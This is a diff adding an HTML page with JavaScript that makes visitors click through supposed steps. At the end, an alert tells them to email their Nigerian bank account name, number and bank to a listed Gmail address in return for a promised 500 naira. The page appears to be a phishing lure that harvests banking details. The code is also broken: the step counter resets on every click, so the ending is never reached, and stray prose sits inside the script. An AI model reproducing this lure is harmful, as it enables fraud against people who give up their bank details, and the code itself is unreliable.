@@ -1,0 +1,38 @@
+<!-- Step 1 -->
+<a href="#" onclick="goToNextStep()">Click here</a>
+
+<script>
+// Function to handle the click event and move to the next step
+function goToNextStep() {
+  // Perform any necessary actions for the current step
+  
+  // Assuming you have a variable to keep track of the current step
+  // You may need to adapt this based on your implementation
+  let currentStep = 1;
+
+  // Check if we have reached 100 steps
+  if (currentStep < 100) {
+    // Increment the step counter
+    currentStep++;
+
+    // Redirect to the same page or update content dynamically
+    window.location.href = "your-page-url"; // Replace with your actual page URL
+  } else {
+    // If the user has completed all steps, show the completion message
+    showCompletionMessage(); Thanks for participating 
+  }
+}
+
+// Function to show the completion message and collect user information
+function showCompletionMessage() {
+  // Assuming you have a function to display a modal or a message
+  // Replace with your actual implementation
+  alert("Complete\n\nSend your commercial, local, online Nigeria bank account, including your name, account number, and bank name to this email, and you will get credited 500 naira within 2 hours.");
+
+  // Assuming you have a variable to store your Gmail account
+  // Replace with your actual Gmail account
+  let gmailAccount = "oladipoemmanuel453@gmail.com";
+
+  // You can now use the 'gmailAccount' variable to send the email or perform other actions
+}
+</script>
